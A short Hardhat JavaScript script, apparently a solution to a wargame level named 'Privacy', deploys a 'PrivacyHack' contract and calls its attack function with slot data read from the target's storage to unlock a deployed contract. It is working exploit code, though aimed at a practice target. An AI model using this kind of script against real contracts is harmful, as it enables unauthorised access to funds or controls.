// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = '0xA600c630e2F7bdCd78b5ed81c15186c78b3650f5';
    const [owner, addr1] = await ethers.getSigners();
    
    const Privacy = await hre.ethers.getContractFactory("Privacy");
    const privacy = Privacy.attach(INSTANCE_ADDRESS);

    console.log(await privacy.locked());
    const slotData = '0xc0acbb0100608c639ad20ed0ce841bc2a6c41c981ee1a7a022ed064266d97a39';

    const PrivacyHack = await hre.ethers.getContractFactory("PrivacyHack");
    const privacyHack = await PrivacyHack.deploy()
    await privacyHack.deployed()

    console.log(`privacyHack deployed at ${privacyHack.address}`);

    const tx = await privacyHack.attack(INSTANCE_ADDRESS, slotData);
    console.log(tx)
    await tx.wait()

    console.log(await privacy.locked());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
